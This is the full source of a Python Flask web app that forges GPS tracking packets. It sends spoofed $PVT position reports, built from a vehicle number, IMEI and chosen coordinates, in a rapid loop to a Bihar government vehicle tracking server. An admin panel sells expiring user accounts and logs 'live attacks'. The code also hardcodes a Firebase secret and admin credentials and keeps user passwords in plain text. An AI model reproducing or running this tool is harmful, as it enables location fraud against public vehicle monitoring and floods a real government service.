import os, socket, threading, time, requests
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "nitro_v82_final_whatsapp_edition"

# --- CONFIGURATION (SAME AS GITHUB) ---
FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"
TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

# --- ADMIN CREDENTIALS ---
ADMIN_UID = "admin"
ADMIN_PASS = "admin6721"

# --- ENGINE STATE ---
status = {"firing": False, "count": 0, "proto": "UDP", "imei": "", "vno": "", "lat": "", "lon": ""}

# --- HTML TEMPLATES ---

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - LOGIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { border: 2px solid #0f0; padding: 30px; border-radius: 15px; background: #050505; box-shadow: 0 0 20px #0f0; width: 320px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; text-align: center; font-size: 16px; }
        .btn { padding: 12px; width: 100%; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; font-size: 16px; }
        .admin-section { margin-top: 25px; padding-top: 15px; border-top: 1px solid #333; }
        .admin-btn { display: block; padding: 12px; background: #111; color: #0f0; border: 1px solid #0f0; text-decoration: none; border-radius: 5px; font-weight: bold; font-size: 15px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2 style="letter-spacing: 2px;">🫦 GHOP-GHOP GPS</h2>
        {% if error %}<div style="color:red; margin-bottom:10px;">{{error}}</div>{% endif %}
        <form method="post">
            <input type="text" name="userid" placeholder="USER ID" required>
            <input type="password" name="password" placeholder="PASSWORD" required>
            <button class="btn">LOGIN SYSTEM</button>
        </form>
        <div class="admin-section">
            <a href="/admin_login_page" class="admin-btn">⚙️ ADMIN CONTROL PANEL</a>
        </div>
    </div>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO PRO ADMIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        :root { --neon: #0f0; --bg: #000; --card: #0a0a0a; }
        body { background: var(--bg); color: #fff; font-family: sans-serif; margin: 0; padding: 10px; }
        .nav { background: var(--card); padding: 15px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; }
        .section { background: var(--card); padding: 20px; border-radius: 12px; margin: 15px 0; border: 1px solid #222; }
        h2 { color: var(--neon); font-size: 18px; border-bottom: 1px solid #333; padding-bottom: 10px; margin-top:0; }
        input, button { background: #111; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 6px; width: 100%; margin-bottom: 10px; box-sizing: border-box; }
        button.primary { background: var(--neon); color: #000; font-weight: bold; border: none; cursor: pointer; height: 45px; font-size: 15px; }
        .table-box { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { background: #1a1a1a; color: var(--neon); padding: 12px; text-align: left; }
        td { padding: 12px; border-bottom: 1px solid #111; }
        .row { display: flex; gap: 10px; }
    </style>
</head>
<body>
    <div class="nav">
        <b>🚀 NITRO V82 ADMIN</b>
        <a href="/logout" style="color:red; text-decoration:none; font-weight:bold;">LOGOUT</a>
    </div>

    <div class="section">
        <h2>➕ CREATE / UPDATE USER</h2>
        <form action="/admin/add" method="POST">
            <input name="new_uid" placeholder="User ID (Phone Number)" required>
            <input name="new_pw" placeholder="Assign Password" required>
            <div class="row">
                <input name="base_lat" placeholder="Base Latitude">
                <input name="base_lon" placeholder="Base Longitude">
            </div>
            <input type="date" name="expiry" required>
            <button class="primary">PROCEED</button>
        </form>
    </div>

    <div class="section">
        <h2>👥 REGISTERED USERS</h2>
        <div class="table-box">
            <table>
                <tr><th>ID</th><th>PASS</th><th>EXPIRY</th><th>LAT/LON</th><th>ACTION</th></tr>
                {% for uid, data in users.items() %}
                <tr>
                    <td>{{uid}}</td><td>{{data.password}}</td><td>{{data.expiry}}</td>
                    <td style="color:#888; font-size:11px;">{{data.lat}}, {{data.lon}}</td>
                    <td>
                        <a href="/admin/toggle/{{uid}}" style="color:orange;">[B]</a>
                        <a href="/admin/delete/{{uid}}" style="color:red; margin-left:10px;">[X]</a>
                    </td>
                </tr>
                {% endfor %}
            </table>
        </div>
    </div>

    <div class="section">
        <h2>🔥 LIVE ATTACKS (REAL-TIME)</h2>
        <div class="table-box">
            <table>
                <tr><th>VEHICLE</th><th>USER</th><th>LAST SYNC</th></tr>
                {% for vno, log in records.items() %}
                <tr><td style="color:var(--neon)">{{vno}}</td><td>{{log.User}}</td><td style="color:#888;">{{log.Last_Sync}}</td></tr>
                {% endfor %}
            </table>
        </div>
    </div>
</body>
</html>
"""

DASH_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - DASHBOARD</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; width: 100%; max-width: 480px; background: #050505; box-shadow: 0 0 20px #0f0; }
        #map { height: 300px; width: 100%; max-width: 480px; border: 2px solid #0f0; border-radius: 15px; }
        .metric { font-size: 50px; color: #fff; margin: 10px 0; font-weight: bold; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; }
        input, select { width: 90%; padding: 10px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
        .full { grid-column: span 2; }
        .btn { padding: 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
        .start { background: #008000; color: #fff; }
        .stop { background: #800; color: #fff; }
        .gps { background: #004466; color: #fff; border: 1px solid #00ffff; }
        .reset { background: #333; color: #fff; }
        .logout { background: none; color: #f00; border: 1px solid #f00; padding: 5px; font-size: 10px; cursor: pointer; float: left; }
        .preview { background: #111; color: yellow; padding: 12px; font-size: 11px; word-break: break-all; margin-top: 15px; border: 1px dashed #0f0; min-height: 60px; }
        label { font-size: 11px; color: #aaa; margin-left: 5px; }
    </style>
</head>
<body>
    <div class="box">
        <form action="/logout" method="post"><button class="logout">LOGOUT: {{session['user']}}</button></form>
        <div style="clear:both;"></div>
        <h2 style="margin-top:10px;">💋 GHOP-GHOP GPS 💋</h2>
        <div class="metric" id="cnt">0</div>
        <form action="/action" method="post" class="grid">
            <div class="full">
                <label>VEHICLE NO</label>
                <input type="text" name="vno" id="vno" value="{{vno}}" placeholder="BR01..." oninput="this.value = this.value.toUpperCase(); updateUI();" onblur="checkVehicle()">
            </div>
            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{imei}}" placeholder="862..." oninput="updateUI()"></div>
            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{lat}}" oninput="updateUI()"></div>
            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{lon}}" oninput="updateUI()"></div>
            <button type="button" class="btn gps full" onclick="getLocation()">📍 GET CURRENT LOCATION</button>
            <div class="full">
                <label>PROTOCOL</label>
                <select name="proto" id="proto" onchange="updateUI()">
                    <option value="UDP" {% if proto == 'UDP' %}selected{% endif %}>UDP</option>
                    <option value="TCP" {% if proto == 'TCP' %}selected{% endif %}>TCP</option>
                </select>
            </div>
            <button class="btn start full" name="btn" value="start">🔥 START ENGINE</button>
            <button class="btn stop full" name="btn" value="stop">🛑 STOP ENGINE</button>
            <button class="btn reset full" name="btn" value="reset">🔄 RESET ALL</button>
        </form>
    </div>
    <div id="map"></div>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        var map = L.map('map').setView([{{lat or 25.65}}, {{lon or 84.78}}], 15);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        var marker = L.marker([{{lat or 25.65}}, {{lon or 84.78}}]).addTo(map);
        async function checkVehicle() {
            let v = document.getElementById('vno').value.toUpperCase();
            if(!v) return;
            let r = await fetch(`/check_vehicle?vno=${v}`);
            let d = await r.json();
            if(d.imei) { document.getElementById('imei').value = d.imei; }
        }
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => {
                    document.getElementById('lat').value = p.coords.latitude.toFixed(7);
                    document.getElementById('lon').value = p.coords.longitude.toFixed(7);
                });
            }
        }
        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('cnt').innerText = d.count.toLocaleString();
            });
        }, 1000);
    </script>
</body>
</html>
"""

# --- LOGIC (NO CHANGES TO ENGINE) ---

def log_to_firebase():
    try:
        now = datetime.now()
        u, v = session.get('user'), status["vno"]
        d = {"Vehicle_No": v, "IMEI_No": status["imei"], "User": u, "Lat": status["lat"], "Lon": status["lon"], "Last_Sync": now.strftime('%Y-%m-%d %H:%M:%S'), "Status": "Active"}
        requests.put(f"{FB_URL}/Data_Records/{v}.json?auth={FB_SECRET}", json=d, timeout=5)
        requests.put(f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{u}/{v}/{now.strftime('%H%M%S')}.json?auth={FB_SECRET}", json=d, timeout=5)
    except: pass

def firing_engine():
    target = ("vlts.bihar.gov.in", 9999)
    while status["firing"]:
        try:
            tag = TAG_LIST[status["count"] % len(TAG_LIST)]
            now = datetime.now()
            f_la, f_lo = "{:.7f}".format(float(status["lat"])), "{:.7f}".format(float(status["lon"]))
            pkt = f"$PVT,{tag},{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{f_la},N,{f_lo},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*".encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if status["proto"] == "UDP" else socket.SOCK_STREAM)
            if status["proto"] == "TCP": sock.settimeout(3); sock.connect(target); sock.send(pkt)
            else: sock.sendto(pkt, target)
            status["count"] += 1
            sock.close()
            time.sleep(0.02)
        except: time.sleep(1)

@app.route('/', methods=['GET', 'POST'])
def login():
    if 'user' in session: return redirect('/dashboard')
    error = None
    if request.method == 'POST':
        uid, pw = request.form.get('userid', '').strip(), request.form.get('password', '').strip()
        r = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}").json()
        if r and str(r.get('password')) == str(pw):
            session.update({'user': uid, 'def_lat': str(r.get('lat', '25.6')), 'def_lon': str(r.get('lon', '84.7'))})
            status.update({"lat": session['def_lat'], "lon": session['def_lon']})
            return redirect('/dashboard')
        error = "INVALID CREDENTIALS"
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/admin_login_page', methods=['GET', 'POST'])
def admin_auth():
    if request.method == 'POST':
        if request.form.get('uid') == ADMIN_UID and request.form.get('pw') == ADMIN_PASS:
            session['is_admin'] = True
            return redirect('/admin')
    return render_template_string('<body style="background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;"><form method="POST" style="border:1px solid #0f0;padding:40px;text-align:center;"><h2>🔐 ADMIN CONTROL</h2><input name="uid" placeholder="ID" style="padding:10px;margin:5px;"><br><input type="password" name="pw" placeholder="PASS" style="padding:10px;margin:5px;"><br><button style="padding:10px 20px;background:#0f0;border:none;font-weight:bold;cursor:pointer;">ENTER</button></form></body>')

@app.route('/admin')
def admin_panel():
    if not session.get('is_admin'): return redirect('/admin_login_page')
    u = requests.get(f"{FB_URL}/users.json?auth={FB_SECRET}").json() or {}
    r = requests.get(f"{FB_URL}/Data_Records.json?auth={FB_SECRET}").json() or {}
    return render_template_string(ADMIN_HTML, users=u, records=r)

@app.route('/admin/add', methods=['POST'])
def add_user():
    uid = request.form.get('new_uid').strip()
    p = {"access_level": "pro", "expiry": request.form.get('expiry'), "password": request.form.get('new_pw'), "status": "Active", "lat": request.form.get('base_lat') or "25.2988", "lon": request.form.get('base_lon') or "84.6510"}
    requests.put(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}", json=p)
    return redirect('/admin')

@app.route('/admin/delete/<uid>')
def delete_user(uid):
    requests.delete(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}")
    return redirect('/admin')

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect('/')
    return render_template_string(DASH_HTML, **status)

@app.route('/check_vehicle')
def check_vehicle():
    v = request.args.get('vno', '').upper()
    r = requests.get(f"{FB_URL}/Data_Records/{v}.json?auth={FB_SECRET}").json()
    return jsonify({"imei": r.get('IMEI_No') if r else None})

@app.route('/action', methods=['POST'])
def action():
    val = request.form.get('btn')
    if val == "start":
        status.update({"imei": request.form.get('imei').strip(), "vno": request.form.get('vno').upper().strip(), "lat": request.form.get('lat').strip(), "lon": request.form.get('lon').strip(), "proto": request.form.get('proto', 'UDP'), "firing": True})
        log_to_firebase()
        threading.Thread(target=firing_engine, daemon=True).start()
    else: status["firing"] = False
    return redirect('/dashboard')

@app.route('/logout')
def logout(): session.clear(); return redirect('/')

@app.route('/data')
def data(): return jsonify(status)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
